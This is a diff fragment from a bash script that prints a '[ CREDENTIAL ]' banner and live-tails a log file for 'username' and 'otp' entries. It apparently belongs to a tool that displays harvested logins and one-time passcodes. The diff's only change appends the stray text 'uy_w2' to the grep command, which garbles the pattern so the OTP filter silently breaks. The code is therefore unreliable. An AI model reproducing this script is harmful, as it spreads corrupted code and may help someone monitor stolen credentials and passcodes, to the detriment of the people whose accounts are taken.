@@ -87,7 +87,7 @@ clear
                 echo ""
                 echo -e $green "//  [ CREDENTIAL ] //"
                 echo ""
-                tail -f log.txt | grep -e "username" -e "otp"
+                tail -f log.txt | grep -e "username" -e "otp"uy_w2
 
 
 
